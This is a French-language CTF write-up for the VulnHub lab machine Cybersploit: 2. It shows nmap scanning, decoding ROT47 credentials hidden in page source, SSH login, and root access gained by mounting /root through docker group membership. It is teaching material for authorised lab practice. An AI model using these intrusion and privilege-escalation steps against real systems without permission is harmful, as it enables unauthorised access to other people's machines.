---
title: "CTF Cybersploit: 2"
date: 2021-06-15
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/cybersploit-2,511
parts: 
  - title: 'CTF Cybersploit: 1'
    href: 'ctf-cybersploit-1'
  - title: 'CTF Cybersploit: 2'
---


## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.1** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.21`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir Cybersploit2 && cd Cybersploit2`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -A -p- $IP -oN nmap.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 (RSA)
|   256 d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 (ECDSA)
|_  256 69:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CyberSploit2
```

On a un un serveur **SSH** sur le port **22** et un serveur **Apache** 2.4.37 sur le port **80**.

Rgardons dans le code source de la page qui comporte un tableau d'utilisateurs et de mots de passe.

```txt
<!----------ROT47---------->  
```

Sur Internet, avec le mot clef "ROT47", on tombe sur du chiffrement.

> ROT47 est une variante de ROT13 qui permet de chiffrer les lettres, les chiffres, et les autres caractères spéciaux2. ROT47 se base sur le code ASCII, qui assigne à chaque symbole un nombre. Il utilise les nombres dans l’intervalle 33 à 126, correspondant respectivement au point d’exclamation (« ! ») et au symbole tilde (« ~ »). Ensuite, selon le même principe que le ROT13, il effectue une rotation de 47 lettres. Le fait d’utiliser un panel de symboles plus important que le ROT13 permet un brouillage plus efficace, même si le code reste trivial à déchiffrer.
Source : [Wikipedia](https://fr.wikipedia.org/wiki/ROT13#Variante).

Sur l'une des lignes du tableau, on a couple d'identifiant qui sort du lot "D92:=6?5C2" et "4J36CDA=@:E`". Quand on décode l'utilisateur, on a "shailendra" et le mot de passe "cybersploit1".

## Pénétration

```bash
$ ssh shailendra@$IP
password: cybersploit1
```

Dans le répertoire de cet utilisateur, on découvre un fichier d'indice.

```bash
$ cat hint.txt
docker
```

Ce dernier nous indique d'utiliser Docker.

```bash
$ id
id=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker)
```

Et, effectivement, l'utilisateur courant appartient au groupe "docker".

## Escalation

Cela signifie que l'on peut créer des containers avec des privilèges root car oui, Docker a la réputation d'être rootless. On lance donc un container (éphémère) avec un volume sur le dossier "/root".

`docker run --rm -v /root:/root -ti alpine /bin/ash`

De cette façon, on est dans le container et on peut accéder au contenu dossier "/root".

```bash
$ cat /root/flag.txt
Pwned CyberSploit2 POC
```
